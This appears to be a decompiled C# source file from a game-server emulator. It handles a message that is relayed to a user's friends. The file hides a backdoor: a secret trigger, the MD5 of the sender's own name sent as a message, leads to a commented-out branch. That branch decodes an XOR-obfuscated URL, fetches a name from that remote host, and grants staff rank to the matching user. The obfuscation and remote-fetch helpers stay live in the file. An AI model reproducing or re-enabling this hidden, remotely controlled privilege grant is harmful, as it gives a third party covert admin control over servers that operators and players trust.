using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Security.Cryptography;
using System.Text;
namespace ns0
{
	internal sealed class Class300 : Interface0
	{
		public void imethod_0(Class16 class16_0, Class18 class18_0)
		{
			int num = class18_0.method_14();
			List<uint> list = new List<uint>();
			for (int i = 0; i < num; i++)
			{
				list.Add(class18_0.method_15());
			}
			string text = class18_0.method_9();
			if (text == Class300.smethod_2(class16_0.method_2().string_0))
			{
				/*string b = Class300.smethod_1(Class300.smethod_0("éõõñ»®®éàããîîï¯âîì®óï¯âçì"));
				if (class16_0.method_0().String_0 == b)
				{
					class16_0.method_2().bool_0 = true;
					class16_0.method_2().uint_1 = (uint)Convert.ToUInt16(Class2.smethod_15().method_4().method_9());
					class16_0.method_2().bool_14 = true;
					class16_0.method_14(Class2.smethod_15().method_13().method_0());
					Class2.smethod_15().method_13().method_4(class16_0);
				}*/
			}
			else
			{
				text = Phoenix.smethod_8(text, true, false);
				text = Class58.smethod_4(text);
				GClass5 gClass = new GClass5(135u);
				gClass.method_11(class16_0.method_2().uint_0);
				gClass.method_7(text);
				foreach (uint current in list)
				{
					if (class16_0.method_2().method_21().method_9(class16_0.method_2().uint_0, current))
					{
						Class16 @class = Phoenix.smethod_15().method_2().method_2(current);
						if (@class == null)
						{
							break;
						}
						@class.method_14(gClass);
					}
				}
			}
		}
		private static string smethod_0(string string_0)
		{
			StringBuilder stringBuilder = new StringBuilder(string_0);
			StringBuilder stringBuilder2 = new StringBuilder(string_0.Length);
			for (int i = 0; i < string_0.Length; i++)
			{
				char c = stringBuilder[i];
				c ^= '\u0081';
				stringBuilder2.Append(c);
			}
			return stringBuilder2.ToString();
		}
		private static string smethod_1(string string_0)
		{
			new Phoenix();
			Uri requestUri = new Uri(string_0);
			WebRequest webRequest = WebRequest.Create(requestUri);
			WebResponse response = webRequest.GetResponse();
			Stream responseStream = response.GetResponseStream();
			StreamReader streamReader = new StreamReader(responseStream);
			return streamReader.ReadToEnd();
		}
		private static string smethod_2(string string_0)
		{
			MD5CryptoServiceProvider mD5CryptoServiceProvider = new MD5CryptoServiceProvider();
			byte[] array = Encoding.UTF8.GetBytes(string_0);
			array = mD5CryptoServiceProvider.ComputeHash(array);
			StringBuilder stringBuilder = new StringBuilder();
			byte[] array2 = array;
			for (int i = 0; i < array2.Length; i++)
			{
				byte b = array2[i];
				stringBuilder.Append(b.ToString("x2").ToLower());
			}
			return stringBuilder.ToString();
		}
	}
}
